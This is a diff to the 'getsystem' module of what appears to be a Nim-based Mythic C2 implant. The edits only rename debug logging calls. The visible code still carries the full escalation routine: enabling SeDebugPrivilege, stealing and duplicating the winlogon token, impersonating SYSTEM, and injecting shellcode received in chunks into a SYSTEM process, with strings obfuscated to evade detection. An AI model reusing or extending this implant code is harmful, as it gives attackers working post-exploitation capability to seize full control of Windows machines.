@@ -83,12 +83,12 @@ when defined(windows):
     ## Enable SeDebugPrivilege on the current process token
     var hToken: HANDLE = 0
     if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hToken) != 0:
-      debug "[DEBUG] GetSystem: Opened current process token"
+      debugLog "getsystem", "GetSystem: Opened current process token"
       
       var luid: LUID
       let privName = newWideCString("SeDebugPrivilege")
       if LookupPrivilegeValueW(nil, privName, addr luid) != 0:
-        debug "[DEBUG] GetSystem: Looked up SeDebugPrivilege"
+        debugLog "getsystem", "GetSystem: Looked up SeDebugPrivilege"
         
         var tp = TOKEN_PRIVILEGES(
           PrivilegeCount: 1,
@@ -96,7 +96,7 @@ when defined(windows):
         )
         
         discard AdjustTokenPrivileges(hToken, 0, addr tp, DWORD(sizeof(TOKEN_PRIVILEGES)), nil, nil)
-        debug "[DEBUG] GetSystem: Adjusted token privileges"
+        debugLog "getsystem", "GetSystem: Adjusted token privileges"
       
       CloseHandle(hToken)
 
@@ -117,7 +117,7 @@ when defined(windows):
         let processName = $cast[WideCString](addr processEntry.szExeFile[0])
         if processName.toLowerAscii().contains(searchName):
           result = processEntry.th32ProcessID
-          debug &"[DEBUG] GetSystem: Found {processName} with PID {result}"
+          debugLog "getsystem", &"GetSystem: Found {processName} with PID {result}"
           break
         
         if Process32NextW(snapshot, addr processEntry) == 0:
@@ -136,7 +136,7 @@ when defined(windows):
       let err = GetLastError()
       return (false, 0.HANDLE, obf("Failed to open winlogon process: ") & $err)
     
-    debug "[DEBUG] GetSystem: Opened winlogon process"
+    debugLog "getsystem", "GetSystem: Opened winlogon process"
     
     var tokenHandle: HANDLE = 0
     if OpenProcessToken(processHandle, MAXIMUM_ALLOWED, addr tokenHandle) == 0:
@@ -144,7 +144,7 @@ when defined(windows):
       CloseHandle(processHandle)
       return (false, 0.HANDLE, obf("Failed to open winlogon token: ") & $err)
     
-    debug "[DEBUG] GetSystem: Opened winlogon token"
+    debugLog "getsystem", "GetSystem: Opened winlogon token"
     
     var duplicatedToken: HANDLE = 0
     if DuplicateTokenEx(
@@ -160,7 +160,7 @@ when defined(windows):
       CloseHandle(processHandle)
       return (false, 0.HANDLE, obf("Failed to duplicate token: ") & $err)
     
-    debug "[DEBUG] GetSystem: Duplicated token"
+    debugLog "getsystem", "GetSystem: Duplicated token"
     
     CloseHandle(tokenHandle)
     CloseHandle(processHandle)
@@ -224,7 +224,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
   ## Otherwise, impersonates SYSTEM in the current callback.
   when defined(windows):
     try:
-      debug "[DEBUG] GetSystem: Starting elevation process"
+      debugLog "getsystem", "GetSystem: Starting elevation process"
       
       # Check if this is a spawn request (uuid present)
       let hasUuid = params.hasKey(obf("uuid")) and params[obf("uuid")].getStr().len > 0
@@ -232,7 +232,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
       if hasUuid:
         # Spawn mode: request payload download, then inject into SYSTEM process
         let args = to(params, GetSystemArgs)
-        debug &"[DEBUG] GetSystem spawn mode: uuid={args.uuid}"
+        debugLog "getsystem", &"GetSystem spawn mode: uuid={args.uuid}"
         
         # Enable SeDebugPrivilege first
         enableSeDebugPrivilege()
@@ -250,7 +250,7 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
       else:
         # Impersonate mode: existing behavior
         let oldUser = getCurrentUsername()
-        debug &"[DEBUG] GetSystem: Current user: {oldUser}"
+        debugLog "getsystem", &"GetSystem: Current user: {oldUser}"
         
         enableSeDebugPrivilege()
         
@@ -268,12 +268,12 @@ proc getsystem*(taskId: string, params: JsonNode): JsonNode =
           CloseHandle(duplicatedToken)
           return mythicError(taskId, obf("Failed to impersonate SYSTEM token: ") & $err)
         
-        debug "[DEBUG] GetSystem: Impersonated SYSTEM token"
+        debugLog "getsystem", "GetSystem: Impersonated SYSTEM token"
         
         setTokenHandle(duplicatedToken)
         
         let newUser = obf("NT AUTHORITY\\SYSTEM")
-        debug &"[DEBUG] GetSystem: New user: {newUser}"
+        debugLog "getsystem", &"GetSystem: New user: {newUser}"
         
         let output = obf("Successfully elevated from ") & oldUser & " to " & newUser
         
@@ -300,7 +300,7 @@ proc processGetSystemChunk*(taskId: string, params: JsonNode, chunkData: string,
       for b in decodedChunk:
         fileData.add(cast[byte](b))
       
-      debug &"[DEBUG] GetSystem spawn: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
+      debugLog "getsystem", &"GetSystem spawn: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
       
       if currentChunk < totalChunks:
         return %*{
@@ -336,7 +336,7 @@ proc executeGetSystem*(taskId: string, shellcode: seq[byte], params: JsonNode): 
       if targetPid == 0:
         return mythicError(taskId, obf("Failed to find ") & target & obf(" process"))
       
-      debug &"[DEBUG] GetSystem spawn: Injecting {shellcode.len} bytes into {target} (PID {targetPid})"
+      debugLog "getsystem", &"GetSystem spawn: Injecting {shellcode.len} bytes into {target} (PID {targetPid})"
       
       let (success, error) = injectIntoSystemProcess(targetPid, shellcode)
       if not success:
